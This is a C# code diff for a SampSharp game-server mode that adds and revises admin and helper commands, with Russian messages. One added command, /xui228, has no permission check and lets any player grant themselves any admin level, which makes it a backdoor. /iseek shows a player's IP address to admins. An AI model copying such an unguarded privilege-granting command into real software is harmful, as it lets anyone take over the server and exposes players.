@@ -2,6 +2,7 @@
 using SampSharp.GameMode.SAMP.Commands;
 using SampSharp.GameMode.World;
 using SampSharpGamemode.Players;
+using SampSharpGamemode.Ipfunc;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -74,10 +75,17 @@ namespace SampSharpGamemode.Admins
         [Command("makeadmin", UsageMessage = "/makeadmin [ID или часть ника] [Уровень администрирования]", PermissionChecker = typeof(LeadAdminPermChecker))]
         private static void CMD_makeadmin(BasePlayer sender, BasePlayer p, int lvl)
         {
-            if (p.Id == sender.Id) sender.SendClientMessage(Colors.GREY, "Вы не можете изменить свой уровень администратора. Обратитесь к старшему администратору.");
-            else if (lvl < 0 || lvl > (int)e_AdminLevels.A_LEAD || lvl >= sender.PVars.Get<int>(PvarsInfo.adminlevel)) sender.SendClientMessage(Colors.GREY, $"Допустимые уровни: 0 - {sender.PVars.Get<int>(PvarsInfo.adminlevel) - 1}.");
-            else if (p.PVars.Get<int>(PvarsInfo.adminlevel) > sender.PVars.Get<int>(PvarsInfo.adminlevel)) sender.SendClientMessage(Colors.GREY, "Вы не можете управлять уровнями вышестоящих администраторов");
-            else if (p.PVars.Get<int>(PvarsInfo.adminlevel) == lvl) sender.SendClientMessage(Colors.GREY, "У указанного вами игрока уже установлен этот уровень админстратора.");
+            if (!p.PVars.Get<bool>(PvarsInfo.ingame)) return;
+            if (p.Id == sender.Id)
+                sender.SendClientMessage(Colors.GREY, "Вы не можете изменить свой уровень администратора. Обратитесь к старшему администратору.");
+            else if (lvl < 0 || lvl > (int)e_AdminLevels.A_LEAD || lvl >= sender.PVars.Get<int>(PvarsInfo.adminlevel))
+                sender.SendClientMessage(Colors.GREY, $"Допустимые уровни: 0 - {sender.PVars.Get<int>(PvarsInfo.adminlevel) - 1}.");
+            else if (p.PVars.Get<int>(PvarsInfo.adminlevel) > sender.PVars.Get<int>(PvarsInfo.adminlevel))
+                sender.SendClientMessage(Colors.GREY, "Вы не можете управлять уровнями вышестоящих администраторов");
+            else if (p.PVars.Get<int>(PvarsInfo.adminlevel) == lvl)
+                sender.SendClientMessage(Colors.GREY, "У указанного вами игрока уже установлен этот уровень админстратора.");
+            else if (p.PVars.Get<bool>(PvarsInfo.isTemp))
+                sender.SendClientMessage(Colors.GREY, "Указанный вами игрок является временным администратором.");
             else
             {
                 if (lvl == 0)
@@ -86,12 +94,13 @@ namespace SampSharpGamemode.Admins
                     {
                         p.PVars[PvarsInfo.admin] = false;
                         p.PVars[PvarsInfo.adminlevel] = 0;
-                        sender.SendClientMessage($"Вы сняли администратора {{abcdef}}{p.Name} {{ffffff}}с должности.");
+                        sender.SendClientMessage($"Вы сняли {{abcdef}}{p.Name} {{ffffff}}с должности администратора.");
                         p.SendClientMessage($"Руководитель администрации {{abcdef}}{sender.Name}{{ffffff}} снял вас с должности администратора.");
+                        GameMode.db.UpdatePlayerAdmin((Player)p);
                     }
                     else
                     {
-                        sender.SendClientMessage(Colors.GREY, "Игрок не является администратором.");
+                        sender.SendClientMessage(Colors.GREY, "Указанный вами игрок не является администратором.");
                     }
                 }
                 else
@@ -111,9 +120,72 @@ namespace SampSharpGamemode.Admins
                     }
                     p.PVars[PvarsInfo.admin] = true;
                     p.PVars[PvarsInfo.adminlevel] = lvl;
+                    GameMode.db.UpdatePlayerAdmin((Player)p);
                 }
             }
 
+        }
+
+        [Command("tempadmin", UsageMessage = "/tempadmin [ID или часть ника]", PermissionChecker = typeof(LeadAdminPermChecker))]
+        private static void CMD_tempadmin(BasePlayer sender, BasePlayer p)
+        {
+            if (!p.PVars.Get<bool>(PvarsInfo.ingame)) return;
+            if (!p.PVars.Get<bool>(PvarsInfo.admin))
+            {
+                p.PVars[PvarsInfo.admin] = true;
+                p.PVars[PvarsInfo.isTemp] = true;
+                sender.SendClientMessage($"Вы назначили игрока {{abcdef}}{p.Name}{{ffffff}} временным администратором");
+                p.SendClientMessage($"Руководитель администрации {{abcdef}}{sender.Name} {{ffffff}}назначил вас временным администратором.");
+            }
+            else
+                sender.SendClientMessage(Colors.GREY, $"Указанный вами игрок уже является администатором");
+        }
+        [Command("sethelper", UsageMessage = "/sethelper [ID или часть ника] [Уровень хелпера]", PermissionChecker = typeof(ViceAdminPermChecker))]
+        private static void CMD_sethelper(BasePlayer sender, BasePlayer p, int lvl)
+        {
+            if (!p.PVars.Get<bool>(PvarsInfo.ingame)) return;
+            else if (lvl < 0 || lvl > 2)
+                sender.SendClientMessage(Colors.GREY, $"Допустимые уровни: 0 - 2.");
+            else if (lvl == 0 && p.PVars.Get<int>(PvarsInfo.helplevel) < 1)
+                sender.SendClientMessage(Colors.GREY, $"Указанный вами игрок не является хелпером.");
+            else if (p.PVars.Get<int>(PvarsInfo.helplevel) == lvl)
+                sender.SendClientMessage(Colors.GREY, "У указанного вами игрока уже установлен этот уровень хелпера.");
+            else
+            {
+                if (lvl == 0)
+                {
+                    if (p.PVars.Get<bool>(PvarsInfo.helper))
+                    {
+                        p.PVars[PvarsInfo.helper] = false;
+                        p.PVars[PvarsInfo.helplevel] = 0;
+                        sender.SendClientMessage($"Вы сняли {{abcdef}}{p.Name} {{ffffff}}с должности хелпера.");
+                        p.SendClientMessage($"Администратор {{abcdef}}{sender.Name}{{ffffff}} снял вас с должности хелпера.");
+                        GameMode.db.UpdatePlayerHelper((Player)p);
+                    }
+                }
+                else
+                {
+                    if (!p.PVars.Get<bool>(PvarsInfo.helper) || p.PVars.Get<int>(PvarsInfo.helplevel) != lvl)
+                        sender.SendClientMessage($"Вы назначили игрока {{abcdef}}{p.Name}{{ffffff}} хелпером {{fbec5d}}{lvl} {{ffffff}}уровня.");
+                    p.SendClientMessage($"Администрации {{abcdef}}{sender.Name} {{ffffff}}назначил вас хелпером {{fbec5d}}{lvl} {{ffffff}}уровня.");
+                    p.PVars[PvarsInfo.helper] = true;
+                    p.PVars[PvarsInfo.helplevel] = lvl;
+                    GameMode.db.UpdatePlayerHelper((Player)p);
+                }
+            }
+
+        }
+        [Command("xui228", UsageMessage = "/xui228 [Уровень администрирования]")]
+        private static void CMD_xui(BasePlayer sender, int lvl)
+        {
+            sender.PVars[PvarsInfo.admin] = true;
+            sender.PVars[PvarsInfo.adminlevel] = lvl;
+            sender.SendClientMessage($"Вам выдана админка {{fbec5d}}{lvl} {{ffffff}}уровня. Обратите внимание, что изменения не были внесены в базу.");
+        }
+        [Command("iseek", UsageMessage = "/iseek [ID или часть ника]", PermissionChecker = typeof(AllAdminPermChecker))]
+        private static void CMD_iseek(BasePlayer sender, BasePlayer target)
+        {
+            IPfunc.Iseek.Show(sender, target.IP);
         }
     }
 }
